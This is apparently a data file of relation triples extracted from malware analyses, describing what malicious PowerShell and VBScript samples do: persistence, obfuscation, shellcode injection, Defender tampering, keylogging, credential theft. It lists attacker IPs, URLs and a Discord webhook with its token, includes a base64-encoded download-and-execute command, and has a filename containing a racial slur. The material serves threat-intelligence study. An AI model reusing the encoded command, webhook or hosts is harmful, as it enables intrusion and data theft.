+The script	SUB	Execute	Sleep Commands	SLEEP
+The script	SUB	Create	Batch file	EXE
+The script	SUB	Connect	45.82.71.119:443	IP
+The script	SUB	Execute	File	EXE
+the script	SUB	Use	random delay	SLEEP
+The script	SUB	Use	Discord API	Discord API
+The script	SUB	Encrypt	downloaded data	DATA
+The script	SUB	Hide	console window	Console Window
+'server.exe'	EXE	Hosted	GitHub	EXTERNAL SERVICE	
+The script	SUB	Decode	strings	DATA
+$ODW	VAR	Generated	$KEZ	VAR
+PowerShell execution policies	PS COMMAND	Have	-w hidden	BYPASS PARAMETER
+The script	SUB	Inject	malicious DLL	DLL
+The script	SUB	Use	CreateThread	WAPI
+scheduled task 'coinmarketcap'	TASK	Execute	every minute	FREQUENCY
+The script	SUB	Write	XX.vbs	EXE
+The script	SUB	Use	System.Runtime.InteropServices.Marshal::Copy	Marshal::Copy FUNCTION
+The script	SUB	Decrypt	p9d2.exe	EXE
+long byte sequence	OBF	Execute	IEX	COMMAND
+The script	SUB	Execute	PowerShell remoting	PS COMMAND
+The script	SUB	Execute	a byte array	OBF
+VirtualAlloc	WAPI	Have	dwSize: max($JFmAXPFHnGfI.length, 0x1000)	ADDRESS PARAMETER
+The script	SUB	Extract	Set-up.exe	EXE
+The script	SUB	Create	Pictures.bat	EXE
+The script	SUB	Execute	hidden malicious code	CODE
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe	EXE	Hosted	Suspicious File Path	PATH	
+The script	SUB	Connect	finalsteptogo.com	URL
+$env:computername-Capture.png	FILE	Saved	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
+keylogged data	PVI	Saved	$env:temp\keylogger.txt	FILE
+start-sleep	COMMAND	Execute	sleep	SLEEP
+The script	SUB	Create	new PowerShell session	PROCESS
+The script	SUB	Allocate	executable memory	MEMORY
+The script	SUB	Have	complex, obfuscated code	OBF
+The script	SUB	Use	PowerShell Encoder	OBF
+The script	SUB	Replace	'app.asar' file	FILE
+base64 encoded string	OBF	Decoded	decrypted byte sequence	DATA
+'YWGCNHBTTYGDVSHYYNDAIO.ps1'	EXE	Is	Obfuscated Code	OBF
+$Ghost	PARAMETER	Have	byte arrays	DATA	
+The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
+scheduled task named "Nothing"	TASK	Execute	every minute	FREQUENCY
+the script	SUB	Download	long byte sequence	DATA
+long byte sequence	DATA	Hosted	an url	URL
+The script	SUB	Use	dynamic code execution	Dynamic code execution ACTION
+The script	SUB	Execute	Start-Sleep -Seconds 15	SLEEP
+The script	SUB	Have	hardcoded access token	ACCESS TOKEN
+Add-Type cmdlet	COMMAND	Load	WindowsBase .NET assembly	NET ASSEMBLY
+The script	SUB	Search	non-public, static fields named "Failed"	Non-public FIELD
+base64 encoding	OBF	Decoded	a large byte array	DATA
+The script	SUB	Create	Win32Functions.EvtrfWgriwFd	FUNCTION with OBF NAME
+$screens.Bounds	FUNCTION	Saved	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
+func_get_proc_address	FUNCTION	Retrieve	address of VirtualAlloc	ADDRESS OF WAPI
+install.vbs	EXE	Execute	PowerShell commands	PS COMMAND
+The script	SUB	Execute	process named 'notice.txt'	PROCESS
+P/Invoke	COMMAND	Import	CreateThread	WAPI
+The script	SUB	Wait	remote server commands	REMOTE COMMAND
+The script	SUB	Execute	Invoke-WebRequest	WebRequest COMMAND
+The script	SUB	Modify	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging	Script Block Logging REGKEY
+PowerShell	PS COMMAND	Have	-Verb RunAs	elevated privileges PARAMETER
+The script	SUB	Have	Suspicious Twitter accounts	Twitter ACCOUNT
+memory (0x3000 bytes)	MEMORY	Load	byte array	DATA
+slmgr	COMMAND	Execute	/ipk /skms /ato /xpr	FUNCTION with OBF NAME
+The script	SUB	Use	kernel32.dll	DLL
+$screens.Bounds	FUNCTION	Write	$env:USERPROFILE\AppData\Local\Temp	TEMP PATH
+WD.bat	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
+system information	PVI	Include	antivirus software	DEFENDER INFO
+The script	SUB	Decode	base64 string	OBF
+The script	SUB	Execute	InvokeSharpHound	COMMAND
+The script	SUB	Use	crypt4	OBF
+The script	SUB	Decode	long byte sequences	OBF
+scheduled task	TASK	Execute	remote connection script	REMOTE CONNECTION
+The script	SUB	Execute	document.pdf	FILE
+Base64 string	OBF	ConvertedTo	byte array	DATA
+The script	SUB	Execute	sleep and retry mechanism	SLEEP
+The script	SUB	Delete	related PowerShell history files	FILE
+System.Windows.Forms	Windows FORM LIBRARY	Use	Microsoft.Win32.UnsafeNativeMethods	INTERNAL WAPI
+The script	SUB	Create	encrypted string	OBF
+PowerShell script	SUB	Use	System.Web.HttpUtility.UrlDecodeToBytes	UrlDecodeToBytes Function
+WD.vbs	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
+InstallUtil.exe	EXE	Use	Byte Array	DATA
+The script	SUB	Collect	Location data	PVI
+The script	SUB	Extract	zip file	COMPRESSED FILE
+The script	SUB	Execute	schtasks /delete /tn det /f	TASK DELETE COMMAND
+The script	SUB	Copy	C:\Users\Administrator\Desktop\backup	ADMINISTRATOR PATH
+DLL	OBF	Use	WaitForSingleObject	WaitForSingleObject WAPI
+PowerShell	PS COMMAND	Have	Reflective DLL Injection	Reflective DLL Injection ACTION
+CreateThread	WAPI	Use	lpThreadAttributes: 0	Security PARAMETER
+The script	SUB	Have	$sc variable	VAR
+The script	SUB	Encode	contents of Run.BAT	BASE64
+The script	SUB	Use	DropBox-Upload function	Upload COMMAND
+active window titles	PVI	SentTo	remote server	REMOTE HOST
+The script	SUB	Upload	zip file	COMPRESSED FILE
+The script	SUB	Delete	WMI event filters and consumers	WMI event filters and consumers	
+WebClient	WAPI	Connect	http://146.70.87.120:445/doc	URL
+VBScript file WD.vbs	EXE	Execute	batch file WD.bat	EXE
+The script	SUB	Create	PowerShell script (JJVXCDAUCHAIHBIEPXDBCS.ps1)	EXE
+The script	SUB	Execute	Decrypted command	COMMAND
+The script	SUB	Stop	Antivirus services	DEFENDER
+mega.zip	FILE	Hosted	https://mega03.b-cdn.net/mega.zip	URL
+The script	SUB	Decode	Base64	OBF
+VBScript file	EXE	Execute	PowerShell script	EXE
+VBScript	EXE	Execute	WD.bat	EXE
+The script	SUB	Connect	external server	REMOST HOST
+The script	SUB	Check	IntPtr size	POINTER SIZE
+The script	SUB	Creates	new thread	THREAD
+The script	SUB	Have	-Ep bypass	BYPASS PARAMETER
+the script	SUB	Collect	current Username	PVI
+file.exe	EXE	Hosted	https://example.com/file.exe	URL
+Scheduled Task	TASK	Execute	VsLabs.vbs	EXE
+CreateThread	WAPI	Have	lpParameter: 0	NULL lpParameter PARAMETER
+Shell.Application	COM	Execute	Insidious.exe	EXE
+the script	SUB	Have	infinite loop	LOOP
+The script	SUB	Disable	Behavior Monitoring	DEFENDER
+khle.exe	EXE	Execute	conhost.exe	EXE
+The script	SUB	Use	Invoke-Expression (IEX)	IEX COMMAND
+The script	SUB	Connect	cdn3.space	EXTERNAL SERVICE
+The script	SUB	Access	user's Documents	PVI
+The script	SUB	Connect	/log.php	EXTERNAL SERVICE
+IEX	COMMAND	Execute	a base64 encoded PowerShell script	OBF EXE
+The script	SUB	Have	Obfuscated Code	OBF
+The script	SUB	Define	custom function go	FUNCTION
+The script	SUB	Contain	Base64-encoded payload	OBF
+The script	SUB	Load	assembly from base64 string	ASSEMBLY
+The script	SUB	Deletes	Temporary PowerShell Scripts	TEMP FILE
+The script	SUB	Have	Obfuscation	OBF
+XX.bat	EXE	Execute	PowerShell scripts	EXE
+TvMusic.vbs	EXE	Have	base64 encoded string	OBF
+Cookie header	COOKIE	Have	encoded data	ENCODED DATA
+QPXCNKQPGRJWIWPIQLPDOP.bat	EXE	Execute	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
+VirtualAlloc	WAPI	Create	memory	MEMORY
+memory created by VirtualAlloc	MEMORY	Load	$GvyxHVFaoQz	OBF
+The script	SUB	OBF	complex encoding scheme	OBF
+IEX	COMMAND	Execute	note.jpg	FILE
+specific file types	DATA	Include	wallet files	DATA
+The script	SUB	Create	scheduled task 'chrome_elf'	TASK
+The script	SUB	Create	mvfp.vbs	EXE
+The script	SUB	Obfuscate	Base64 Encoding	OBF
+The script	SUB	Execute	mezzanines.dll	DLL
+1.exe	EXE	Hosted	http://185.244.11.103	URL
+The script	SUB	Download	1.exe	EXE
+addresses	ADDRESS	Saved	decoded byte sequence	DATA
+The script	SUB	Replace	specific strings	STRING
+VBScript coinmarketcap.vbs	EXE	Execute	batch file 1.bat	EXE
+CallByName	WAPI	Use	Reflective DLL Injection	Reflective DLL Injection
+The script	SUB	Encrypt	files in the user's Downloads folder	FILE
+The script	SUB	Execute	powershell.exe	PS COMMAND
+scheduled task (TvMusic2)	TASK	Create	every 2 minutes, starting from January 1, 2023	FREQUENCE
+The script	SUB	Load	assembly codes from byte array	CODE
+The script	SUB	Creates	delegate for VirtualAlloc Function	DELEGATE
+delegate	DELEGATE	ReferTo	VirtualAlloc	WAPI
+The script	SUB	Use	-NOP -WND HIDDEN	BYPASS PARAMETER
+The script	SUB	Execute	while ($TimesToRun -gt $Runner)	LOOP
+The script	SUB	Create	dynamic delegate	DYNAMIC DELEGATE
+Run.BAT	FILE	Saved	C:\Users\Public\Run\	PATH
+The Script	SUB	Access	C:\Users\Public\Videos	PATH
+PowerShell command	PS COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
+scheduled task	TASK	Execute	VBScript (JJVXCDAUCHAIHBIEPXDBCS.vbs)	EXE
+The script	SUB	Create	libraries.bat	EXE
+data.txt	FILE	Read	Base64-encoded string	OBF
+The script	SUB	Execute	'ngrok.exe'	EXE
+The script	SUB	Execute	'server.exe'	EXE
+The script	SUB	Execute	-EXEC Bypass	BYPASS PARAMETER
+The script	SUB	Execute	Marshal.Copy	Marshal::Copy WAPI
+CreateThread	WAPI	Create	Thread	THREAD
+Thread	THREAD	Execute	$hnzVudhxc	OBF
+The script	SUB	Execute	encoded PowerShell code	OBF EXE
+batch file	EXE	Execute	initial PowerShell script	EXE
+The script	SUB	Execute	WaitForSingleObject	WaitForSingleObject ACTION
+The script	SUB	Modify	LONG_BYTE_SEQUENCE	DATA
+cookies	COOKIE	SetTo	random value	RANDOM VALUE
+Set-MpPreference	COMMAND	Disable	Windows Defender real-time scanning	DEFENDER
+Start-Job	COMMAND	Create	a background job	BACKGROUND JOB
+The script	SUB	Access	caspol.exe	EXE
+Start-Job	COMMAND	Have	parameter -RunAs32	RunAs32 PARAMETER
+The script	SUB	Have	base64 encoding and hexadecimal values	OBF
+RetrieveAll()	Function	Collect	passwords	PVI
+The script	SUB	Execute	with elevated privileges	PRIVILEGE ESCALATE
+kematian.bin	EXE	Hosted	https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin	URL
+The script	SUB	Download	kematian.bin	EXE
+The script	SUB	Load	System.Reflection.Assembly::Load	Reflection.Assembly WAPI
+The script	SUB	Connect	http://50.62.182.1/contadores/index.php	URL
+The script	SUB	Execute	32-bit job	32-bit JOB
+allocated memory	MEMORY	Load	modified byte sequence	DATA
+PowerShell script	EXE	Encrypt	Base64	OBF
+The script	SUB	Use	PowerShell Reflection	Powershell Reflection
+The script	SUB	Use	simple encryption algorithm	ALGORITHM
+The script	SUB	Execute	csc.exe	EXE
+The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
+The script	SUB	Copy	decoded byte sequence	DATA
+The script	SUB	Collect	System's default credentials	PVI
+The script	SUB	Delete	Itself and related files	FILE
+The script	SUB	Decode	base64 encoded string	OBF
+The script	SUB	Execute	Start-Sleep commands	SLEEP
+PowerShell	PS COMMAND	Have	/w 1	BYPASS PARAMETER
+CallByName	FUNCTION	From	Microsoft.VisualBasic.Interaction	LIBRARY
+The script	SUB	Execute	New-Object	COMMAND
+The script	SUB	Use	Invoke-WebRequest	COMMAND
+The script	SUB	Delete	temporary directory	TEMP PATH
+The script	SUB	Have	base64-encoded string	OBF
+The script	SUB	Use	VirtualAlloc	WAPI
+The script	SUB	Have	$ErrorActionPreference = 'SilentlyContinue'	SilentlyContinue PARAMETER
+The script	SUB	Execute	Invoke-RestMethod cmdlet	COMMAND
+The script	SUB	Delete	C:\Temp\file.ps1	TEMP FILE
+C:\Temp\file.ps1	TEMP FILE	Is	ps file	EXE
+The script	SUB	Create	x.ps1	EXE
+The script	SUB	Import	native functions from kernel32.dll	WAPI
+The script	SUB	Create	new process	PROCESS
+The script	SUB	Access	user's Desktop	Desktop PATH
+The script	SUB	Clear	command history	Command history
+The script	SUB	Execute	WebClient	WebClient WAPI
+a file in C:\ProgramData	FILE	Saved	C:\ProgramData	ProgramData PATH
+The script	SUB	Create	VBScript	EXE
+The script	SUB	Execute	RegSvcs.exe	RegSvcs EXE
+stealthy operations	ACTION	Include	looping through objects	LOOP
+The script	SUB	Have	Hardware breakpoints	BREAKPOINT	
+Hardware breakpoints	BREAKPOINT	Change	the execution flow of the script	EXECUTION FLOW
+The script	SUB	Collect	unique AES key	PVI
+Base64 Encoding	OBF	Have	PowerShell command	PS COMMAND
+The script	SUB	Create	cxPsePvskG.SzmjCGUmQG.UskNSZSKwZTHwVAVuaUfdymHT	OBF
+The script	SUB	Use	GZip	COMPRESSED TOOL
+Set-MpPreference	COMMAND	Add Exclusion	.exe and .dll files	EXE
+specific key presses	Keyboard EVENT	Include	Ctrl + Ctrl	Keyboard EVENT
+1.bat	EXE	Execute	dlqp.ps1	EXE
+The script	SUB	Send	current working directory	PVI
+The script	SUB	Create	$env:TMP\BrowserData.txt	FILE
+$env:TMP\BrowserData.txt	FILE	Saved	$env:TMP	TEMP PATH
+new thread	THREAD	Execute	shellcode	EXE
+The script	SUB	Execute	VirtualAlloc	WAPI
+The script	SUB	Use	IEX New-Object	New-Object COMMAND
+Discord webhook	WEBHOOK	Hosted	https://discord.com/api/webhooks/1130780253049081958/cvtl8Oe_E2jfLSgeZ-hlORSj8lneLIMdS4efuyG27PKie0Nxsiscpaj_UL5_AuKAYZfb	URL
+Registry modification	RegKey	Load	non-existent DLL	DLL
+scheduled task	TASK	Have	TaskTrigger	LOOP
+The script	SUB	Connect	Telegram channel	EXTERNAL SERVICE
+Command-Line Arguments	PARAMETER	Refer to	C:\ProgramData\GTZYVDQNGLKWWAYUCNKYHE\GTZYVDQNGLKWWAYUCNKYHE.bat	EXE
+The script	SUB	Execute	while loop	LOOP
+The script	SUB	Execute	Add-Type cmdlet	COMMAND
+Add-Type cmdlet	WAPI	Used for	Unmanaged Code	CODE
+The script	SUB	Download	Sursdepa.vbs	EXE
+The script	SUB	Create	nipplesnigger	FILE
+The script	SUB	Have	Base64 Encoded Binary Data	OBF
+The script	SUB	Check	running as 'SYSTEM' user	PRIVILEDGE
+The script	SUB	Use	Reflection.Assembly::Load()	Reflection.Assembly WAPI
+$env:TMP\BrowserData.txt	FILE	Uploaded	Discord EXTERNAL	URL
+Add-Type cmdlet	COMMAND	Load	System.Drawing	LIBRARY
+The script	SUB	Create	Run.vbs	EXE
+The script	SUB	Create	delegate for Function at memory address	DELEGATE
+The script	SUB	Execute	the same obfuscated code	LOOP
+The script	SUB	Create	'mercifulHaddock.txt'	FILE
+The script	SUB	Decode	Base64 Strings	OBF
+The script	SUB	Download	http://110.42.135.208:64962/image/22.jpg	FILE
+Invoke-Expression	COMMAND	Execute	arbitrary code	CODE
+The script	SUB	Create	C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS	ProgramData PATH
+THe script	SUB	Create	new registry key and value	REGKEY
+The script	SUB	Write	.ps1	EXE
+The script	SUB	Connect	https://clk-info.ru	URL
+The script	SUB	Suppress	Error message	Error message
+the script	SUB	Have	infinite loop	LOOP
+WD.PS1	EXE	Saved	directory in ProgramData	ProgramData PATH
+delegate zV2s3	DELEGATE	Call	VirtualProtect	WAPI
+The script	SUB	Check	PowerShell version >= 5.1	Powershell version	
+The script	SUB	Disable	Script Block Invocation Logging	Script Block Logging
+Disable Script Block Invocation Logging	Disable Script Block Logging	Have	PowerShell version >= 5.1	CONDITION
+libraries.bat	EXE	Hosted	libraries.ps1	EXE
+The script	SUB	Create	batch file	EXE
+The script	SUB	Load	PresentationCore .NET assembly	NET ASSEMBLY
+The script	SUB	Use	ASCII values	OBF
+vbs files	EXE	Hosted	C:\ProgramData\WD	ProgramData PATH
+multiple files	FILE	Hosted	C:\ProgramData\QYZZDAOKPZUJIKAFEZWZDV	ProgramData PATH
+WebClient object	WebClient OBJECT	Have	default web proxy	WebProxy
+The script	SUB	Read	Decompressed stream	DATA
+tr.zip	COMPRESSED FILE	Saved	$pzip	PATH
+The script	SUB	Execute	WD.PS1	EXE
+The script	SUB	Create	scheduled task named log	TASK
+CgKYDo.exe	EXE	Saved	temp path	TEMP PATH
+The script	SUB	Execute	obfuscated code	OBF CODE
+The script	SUB	Copy	$ZPWeIhCk	VAR
+multiple files	FILE	Hosted	C:\ProgramData	ProgramData PATH
+The script	SUB	Modify	registry	RegKey
+The script	SUB	Create	VBScript	EXE
+The script	SUB	Delete	MINGALIES	PATH
+powershell scripts	PS COMMAND	Have	-sta	-sta PARAMETER
+decoded string	DATA	SentTo	System.IO.Compression.DeflateStream	COMPRESSION WAPI
+The script	SUB	Execute	6317a573893bde4aeea7e18e	FILE
+ps1 files	EXE	Hosted	C:\ProgramData\WD	ProgramData	ProgramData PATH	
+System information	PVI	Include	email	PVI
+The script	SUB	Execute	Receive-Job -Wait	COMMAND
+The script	SUB	Have	Obfuscated code	OBF
+The script	SUB	Create	multiple URLs	URL
+The script	SUB	Load	VirtualAlloc	WAPI
+WBPWTLJYGIAVQRJESQDYHO.ps1	EXE	Hosted	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
+$RecentGranita	VAR	Decoded	.NET assembly	NET ASSEMBLY
+thukanthukai.~!!@@!!@@!!~	FILE	Have Name	random strings	RANDNAME
+method 'Execute'	FUNCTION	RECEIVE	decoded byte array	DATA
+The script	SUB	Use	Reflection.Assembly.Load	Reflection.Assembly.Load WAPI
+VBScript file (Nothing.vbs)	EXE	Execute	batch file (1.bat)	EXE
+The script	SUB	Wait	15 seconds	TIME
+delegate	DELEGATE	ReferTo	allocated memory	MEMORY
+The script	SUB	Have	-WindowStyle Hidden	BYPASS PARAMETER
+C:\Users\Public\Run\Run.vbs	EXE	Execute	PowerShell commands	PS COMMAND
+log.ps1	EXE	Saved	hidden directory	HIDDEN PATH
+The script	SUB	Create	files in C:\Users\Public\coinmarketcap	FILE
+The script	SUB	Download	http://checkblacklistwords.eu/words.txt	FILE
+http://checkblacklistwords.eu/words.txt	FILE	Hosted	http://checkblacklistwords.eu	URL	
+The script	SUB	Have	ASCII encoding	OBF
+The script	SUB	Encrypt	Base64 Encoded Command	OBF
+computer names or IP addresses	PVI	Saved	comps*	FILE
+khle.mp3	FILE	RenamedTo	khle.exe	EXE
+The script	SUB	Connect	10.18.1.77:4444	IP ADDRESS
+byte array	DATA	ConvertedTo	PowerShell code	CODE
+Invoke-WebRequest	COMMAND	Output	-OutFile	C:\Temp\file.ps1	EXE
+C:\Temp\file.ps1	EXE	Saved	C:\Temp	TEMP PATH
+The script	SUB	Have	-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBjAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBhAHMAZQBsAGkAbgBlAC4AdABvAHAALwBpAG4AZABlAHgALgBwAGgAcAAiACkA	OBF PARAMETER
+The script	SUB	Execute	PowerShell	EXE
+The script	SUB	Create	temporary folder	TEMP PATH
+shellcode	CODE	Hosted	memory region	MEMORY
+The script	SUB	Create	a new thread	THREAD
+VBoxSVC.exe	EXE	Extract	2.tar	COMPRESSED FILE
+The script	SUB	Use	System.Net.WebClient	WebClient WAPI
+The script	SUB	Create	WD.vbs	EXE
+The script	SUB	Send	result of executed command	PVI
+The script	SUB	Access	user's local app data folder	USER APPDATA PATH
+Loader.vbs	EXE	Execute	PowerShell scripts	EXE
+The script	SUB	Execute	byte array as code	DATA
+ONEN0TEupdate	Suspicious REGKEY Value	Located	HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY
+The script	SUB	Add Exclusion	temporary directory	TEMP PATH
+RCPWUCPIOIVAIRTEYOOWAA	FUNCTION	Dencrypt	long byte sequence	OBF
+The script	SUB	Execute	NS2.exe	EXE
+The script	SUB	Use	Triple DES encryption	ENCRYPTION
+The script	SUB	Allocate	executable memory	MEMORY
+CodeDom function	FUNCTION	Execute	.NET assembly	NET ASSEMBLY
+The script	SUB	Decode	encoded strings	DATA
+The script	SUB	Download	Isass.exe	EXE
+The script	SUB	Use	obfuscated code	OBF
+The script	SUB	Download	http://54.212.206.189/S%!h%rv%!h%rBSTBBB.txt	FILE
+http://54.212.206.189/S%!h%rv%!h%rBSTBBB.txt	FILE	Hosted	http://54.212.206.189	URL	
+The script	SUB	Use	Start-Sleep cmdlet	SLEEP
+The script	SUB	Create	registry key	REGKEY
+The script	SUB	Have	:sl while($true)	LOOP
+The script	SUB	Save	install.vbs	EXE
+XX.bat	EXE	Saved	directory in C:\ProgramData\WD	ProgramData PATH
+the script	SUB	Use	Add-Type cmdlet	Add-Type COMMAND
+The script	SUB	Have	decoders	Decode FUNCTION
+scheduled task	TASK	Execute	every 2 minutes	FREQUENCY
+The script	SUB	Execute	XOR operation	Encryption
+The script	SUB	Use	Remove-Encryption function	Remove-Encryption COMMAND
+tr.zip	COMPRESSED FILE	Saved	$path	PATH
+The script	SUB	Have	XOR Decryption	OBF
+The script	SUB	Have	Obfuscated and Encrypted Strings	OBF
+Base64 Encoded Data	OBF	Hosted	JPEG image	FILE
+netsh	COMMAND	Collect	saved Wi-Fi profiles	PVI
+The script	SUB	Download	1201.rar	COMPRESSED FILE
+GetAsyncKeyState	WAPI	Monitor	key presses	KEYBOARD EVENT
+Decoded string	DATA	Have	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command	PS COMMAND
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command	PS COMMAND	Have	-NoProfile -ExecutionPolicy Bypass -Command	BYPASS PARAMETER	
+The script	SUB	Terminate	FoxitPDFReader	PROCESS
+data	DATA	Loaded	executable memory	MEMORY
+The script	SUB	Check	Trezor folder	PATH
+The script	SUB	Execute	remote script	REMOTE CODE
+text file	FILE	Saved	temporary directory	TEMP PATH
+decoded string	DATA	Have	dynamic .NET type	DYNAMIC NET TYPE
+shove.ke	FILE	Loaded	memory	MEMORY
+The script	SUB	Use	Base64 encoding	OBF
+remote script	REMOTE CODE	Download	hxxp://example.com/script1.ps1	EXE
+hxxp://example.com/script1.ps1	EXE	Hosted	hxxp://example.com	URL	
+install.vbs	EXE	Execute	CreateObject("WScript.Shell")	WScript.Shell OBJECT
+The script	SUB	Delete	temporary files and folders	TEMP PATH
+The script	SUB	Use	base64 encoding	OBF
+The script	SUB	Read	t.png	FILE
+complex string manipulation	OBF	Have	sv and gv cmdlets	COMMAND
+The script	SUB	Execute	EntryPoint method	EntryPoint
+The script	SUB	Compress	contents of the temporary directory	DATA
+The script	SUB	Have	complex obfuscation technique	OBF
+The script	SUB	Use	Start-Sleep	SLEEP
+script	SUB	Execute	Rundll32	DLL
+Marshal::Copy	Marshal::Copy WAPI	CalledWith	$JFmAXPFHnGfI to allocated memory	PARAMETER
+$JFmAXPFHnGfI to allocated memory	PARAMETER	ReferTo	$JFmAXPFHnGfI	DATA
+The script	SUB	Execute	mshta.exe	EXE
+infinite loop	LOOP	Breaks On	cmd.exe process exit	EVENT
+XOR encrypted data	OBF	Saved	the cookie	COOKIE
+PowerShell script	EXE	Create	JZKPPKGTHBOIPSRKOCOKSH.vbs	EXE
+$WebFile	PARAMETER	ReferTo	http://62.182.84.61/4563636/Updater.exe	EXE
+The script	SUB	Read	C:\Users\pwced85\AppData\Roaming\micROSoft\RETJSsvHlCw\ESUzouZqkfPhBIgAtN.OfsSLlxztCh	FILE
+C:\Users\pwced85\AppData\Roaming\micROSoft\RETJSsvHlCw\ESUzouZqkfPhBIgAtN.OfsSLlxztCh	FILE	Saved	AppData	USER APPDATA PATH
+custom function	FUNCTION	Decode	encoded byte sequences	OBF
+The script	SUB	Have	XOR encryption	OBF
+CreateThread	WAPI	Create	a new thread	THREAD
+The script	SUB	Download	item.dat	DATA
+Files	FILE	Hosted	Windows system directory and en-US subdirectory	SYSTEM PATH
+The script	SUB	Access	memory	MEMORY
+oil.exe	EXE	Hosted	http://198.23.212.192/inv/oil.exe	URL
+The script	SUB	Encrypt	hexadecimal string	OBF
+hidden directory	HIDDEN PATH	Hosted	x.ps1	EXE
+long byte sequences	OBF	Converted	.ps1 files	EXE
+shortcut	SHORTCUT	Saved	user's local app data folder	APPDATA PATH
+The script	SUB	Have	-ep bypass	BYPASS PARAMETER
+System information	PVI	Include	PC name	PVI
+complete command	COMMAND	Download	note.jpg	FILE
+start-sleep	COMMAND	Have	7 seconds	TIME
+script	SUB	Execute	Start-Process	START PROCESS COMMAND
+Start-Process	START PROCESS COMMAND	Have	WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Download	https://example.com/evil.exe	EXE
+The script	SUB	Execute	New.BAT	EXE
+'New.vbs'	EXE	Hosted	'C:\Users\Public\Run'	PATH
+The script	SUB	Have	Invoke-Expression (IEX)	IEX COMMAND
+user's clipboard	PVI	Uploaded	Discord webhook	WEBHOOK
+The script	SUB	Collect	standard input, output, error data	DATA
+login data file	FILE	SentTo	Discord webhook	WEBHOOK
+base64 string	OBF	ConvertedTo	byte array	DATA
+compressed data	COMPRESSED DATA	DecompressedTo	payload	DATA
+HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY	SetTo	'C:\a\r.exe'	EXE
+The script	SUB	Have	hardcoded credentials	credential
+The script	SUB	Create	1.bat	EXE
+PowerShell script	EXE	Saved	C:\ProgramData\GRYOJAPQWXHAESUEWDUYNV\NLCBVGPTEAPNTYEQVILCON.ps1	ProgramData PATH
+The script	SUB	Use	VirtualAlloc	WAPI
+The script	SUB	Delete	tr.zip	COMPRESSED FILE
+PowerShell	PS COMMAND	Have	-w 1	BYPASS PARAMETER
+The script	SUB	Ignore	Digital Signature Verification	Digital Signature Verification
+DOf3ghXcVf	FUNCTION	Have Name	random name	RANDOM STRING
+IO.Compression.DecompressStream	DECOMPRESS FUNCTION	Uncompress	Payload	EXE
+The script	SUB	Use	Out-Null	Out-Null COMMAND
+new script block	FILE	Execute	('e'+'xi'+'t') -join ''	String Concatenation COMMAND
+Report.ps1	EXE	Saved	user's AppData folder	USER APPDATA PATH
+The script	SUB	Execute	start-sleep	SLEEP
+screenshots	PVI	SavedTo	user's temporary folder	TEMP PATH
+KeyLogger function	FUNCTION	Collect	logged keystrokes	PVI
+The script	SUB	Use	-WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Create	VsLabs.vbs	EXE
+Start-Process	START PROCESS COMMAND	Execute	markov.exe	EXE
+The script	SUB	Use	CreateThread	WAPI
+new event filter and consumer	EVENT	Trigger	PowerShell command	EXE
+System.IO.Compression.DeflateStream	COMPRESSION WAPI	Decompress	Decompressed stream	DATA
+The script	SUB	Download	document.pdf	FILE
+the script	SUB	Execute	Invoke-Expression	IEX COMMAND
+The script	SUB	Have	functions for encryption and decryption	ENCRYPTION FUNCTION
+RetrievePassword()	Function	Extract	actual password	PVI
+The script	SUB	Execute	file.exe	EXE
+$A123	PARAMETER	Concatenated	$B456	PARAMETER
+The script	SUB	Connect	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Copy	$xpy	DATA
+Multiple files created	FILE	Saved	ProgramData folder	ProgramData PATH
+System information	PVI	Includes	MAC addresses	PVI
+The script	SUB	Use	Marshal::Copy	Marshal::Copy WAPI
+powershell scripts	PS COMMAND	Have	-noP	BYPASS PARAMETER
+The script	SUB	Use	base64 encoding and URL decoding	OBF
+The script	SUB	Write	VsLabs.vbs	FILE
+The script	SUB	Use	CreateThread	WAPI
+The script	SUB	Execute	decrypted PowerShell code	CODE
+The script	SUB	Have	Base64 encoded payload	OBF
+The script	SUB	Connect	173.254.236.136:443	IP ADDRESS
+Invoke-Expression	IEX COMMAND	Decrypt	2.tar.gpg	FILE
+$kgjFavhe	OBF	Loaded	memory	MEMORY
+The script	SUB	Have	-w hidden	BYPASS PARAMETER
+bytes	DATA	Converted To	assembly	NET ASSEMBLY
+a screenshot of the entire screen	PVI	Saved	the temporary folder	TEMP PATH
+The script	SUB	Execute	PowerShell code	CODE
+decoded PowerShell script	SUB	Check	virtual machines and sandbox environments	VM
+PowerShell script (Nothing.ps1)	EXE	Load	a .NET assembly	NET ASSEMBLY
+cookies	COOKIE 	AddedTo	Header of the web quest	WEB QUEST
+The script	SUB	Download	a file	FILE
+The script	SUB	Create	QYZZDAOKPZUJIKAFEZWZDV.bat	EXE
+Decrypted command	COMMAND	Contain	sv jeD	PARAMETER
+stolen credentials (URL, username, password)	PVI	SentTo	Discord webhook	WEBHOOK
+Reflective DLL Injection	Reflective DLL Injection	Execute	System.Reflection.Assembly.Load()	Assembly.Load() WAPI
+actual password	PVI	Saved	tmp44CC.tmp	TEMP FILE
+The script	SUB	Execute	Remove-Item	Remove-Item COMMAND
+$zOJyNrZqgSSiQH	OBF	Have	CreateThread	WAPI
+$YSJXX	OBF	Have	$YHYA	OBF
+payload.zip	FILE	Hosted	\\172.96.161.208@8080\DavWWWRoot	URL
